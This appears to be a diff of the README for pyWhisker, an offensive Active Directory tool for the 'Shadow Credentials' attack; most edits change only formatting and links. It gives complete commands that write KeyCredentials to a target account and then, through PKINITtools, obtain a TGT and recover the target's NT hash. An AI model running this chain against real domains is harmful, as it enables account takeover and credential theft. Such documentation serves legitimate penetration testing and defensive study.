@@ -5,30 +5,30 @@ It's based on [Impacket](https://github.com/SecureAuthCorp/impacket) and on our 
 This tool, along with [Dirk-jan's](https://twitter.com/_dirkjan) [PKINITtools](https://github.com/dirkjanm/PKINITtools) allow for a complete primitive exploitation on UNIX-based systems only.
 
 **Pre-requisites** for this attack are as follows
-1. the target Domain Functional Level must be **Windows Server 2016** or above.
-2. the target domain must have at least one Domain Controller running Windows Server 2016 or above.
-3. the Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
-4. the attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.
+ 1. the target Domain Functional Level must be **Windows Server 2016** or above.
+ 2. the target domain must have at least one Domain Controller running Windows Server 2016 or above.
+ 3. the Domain Controller to use during the attack must have its own certificate and keys (this means either the organization must have AD CS, or a PKI, a CA or something alike).
+ 4. the attacker must have control over an account able to write the `msDs-KeyCredentialLink` attribute of the target user or computer account.
 
 Why some pre-reqs?
-- Pre-reqs 1 and 2 because the PKINIT features were introduced with Windows Server 2016.
-- Pre-req 3 because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction.
+ - Pre-reqs 1 and 2 because the PKINIT features were introduced with Windows Server 2016.
+ - Pre-req 3 because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction.
 
 A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` will be raised if pre-req 3 is not met.
 
 More information about this "Shadow Credentials" primitive
-- [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
-- [The Hacker Recipes - ACEs abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
-- [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)
+ - [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+ - [The Hacker Recipes - ACEs abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
+ - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)
 
 # Usage
 
 pyWhisker supports the following authentications
-- (NTLM) Cleartext password
-- (NTLM) [Pass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/lm-and-ntlm/pass-the-hash)
-- (Kerberos) Cleartext password
-- (Kerberos) [Pass-the-key](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-key) / [Overpass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/overpass-the-hash)
-- (Kerberos) [Pass-the-cache](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-cache) (type of [Pass-the-ticket](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-ticket))
+ - (NTLM) Cleartext password
+ - (NTLM) [Pass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/lm-and-ntlm/pass-the-hash)
+ - (Kerberos) Cleartext password
+ - (Kerberos) [Pass-the-key](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-key) / [Overpass-the-hash](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/overpass-the-hash)
+ - (Kerberos) [Pass-the-cache](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-cache) (type of [Pass-the-ticket](https://www.thehacker.recipes/active-directory-domain-services/movement/kerberos/pass-the-ticket))
 
 Among other things, pyWhisker supports multi-level verbosity, just append `-v`, `-vv`, ... to the command :)
 
@@ -87,6 +87,7 @@ PyWhisker has the ability to list existing KeyCredentials. In addition to that, 
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
 ```
+
 ![](./.assets/list_info.png)
 
 ## Clear and remove
@@ -96,11 +97,13 @@ pyWhisker has the ability to remove specific values or clear the whole attribute
 ```shell
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
 ```
+
 ![](./.assets/remove.png)
 
 ```shell
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
 ```
+
 ![](./.assets/clear.png)
 
 ## Add new values
@@ -109,9 +112,11 @@ pyWhisker has the ability to generate RSA keys, a X509 certificate, a KeyCredent
 The certificate can be exported in a PFX format (#PKCS12, certificate + private key protected with a password) or in a PEM format (PEM certificate, PEM private key, no password needed).
 
 ### Example with the PFX format
+
 ```shell
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --output-path test1
 ```
+
 ![](./.assets/add_pfx.png)
 
 Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).
@@ -120,12 +125,15 @@ Once the values are generated and added by pyWhisker, a TGT can be request with 
 python3 PKINITtools/gettgtpkinit.py -cert-pfx test1.pfx -pfx-pass xl6RyLBLqdhBlCTHJF3R domain.local/user2 user2.ccache
 python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df623de048d600d4e2f156aa9 domain.local/user2
 ```
+
 ![](./.assets/add_pfx_gettgtnthash.png)
 
 ### Example with the PEM format
+
 ```shell
 python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --output-path test2 --export PEM
 ```
+
 ![](./.assets/add_pem.png)
 
 Once the values are generated and added by pyWhisker, a TGT can be request with [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). The NT hash can then be recovered with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py).
@@ -134,6 +142,7 @@ Once the values are generated and added by pyWhisker, a TGT can be request with 
 python3 PKINITtools/gettgtpkinit.py -cert-pem test2_cert.pem -key-pem test2_priv.pem domain.local/user2 user2.ccache
 python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a1553f15fdf24731731cecad16 domain.local/user2
 ```
+
 ![](./.assets/add_pem_gettgtnthash.png)
 
 # Relayed authentication
@@ -152,10 +161,12 @@ Computer objects can edit their own `msDS-KeyCredentialLink` attribute but **can
 
 ![](./.assets/computers_can_self_edit.png)
 
-If you encounter errors, make sure there is no time skew between your attacker host and the Key Distribution Center (usually the Domain Controller). In order to avoid that error, the certificates are valid 40 years before actual date, and 40 years after.
+If you encounter errors, make sure there is no time skew between your attacker host and the Key Distribution Center (usually the Domain Controller). In order to avoid that error, the certificates generated by the pyWhisker tool are valid 40 years before the current date and 40 years after.
 
 # Credits and references
 
-Credits to Dirk-Jan for his work on PKINITtools. We initially planned on refactoring Impacket scripts (especially gettgt.py) to implement asymmetric PKINIT pre-authentication for Kerberos. He saved us a huge deal of headaches by writing it before us!
-Credits to the whole team behind Impacket and its contributors.
-Credits to Elad Shamir who created the original C# tool (Whisker) and to Michael Grafnetter who made DSInternals, a library doing most of Whisker's heavy lifting. He also was the one who made the original Black Hat demo presenting the primitive.
+ - Credits to [Dirk-jan](https://twitter.com/_dirkjan) for his work on [PKINITtools](https://github.com/dirkjanm/PKINITtools/). We initially planned on refactoring Impacket scripts (especially [gettgt.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py)) to implement asymmetric PKINIT pre-authentication for Kerberos. He saved us a huge deal of headaches by writing it before us!
+ 
+ - Credits to the whole team behind [Impacket](https://github.com/SecureAuthCorp/impacket/) and its contributors.
+ 
+ - Credits to [Elad Shamir](https://twitter.com/elad_shamir) who created the original C# tool ([Whisker](https://github.com/eladshamir/Whisker)) and to Michael Grafnetter who made DSInternals, a library doing most of Whisker's heavy lifting. He also was the one who made the original Black Hat demo presenting the attack primitive.
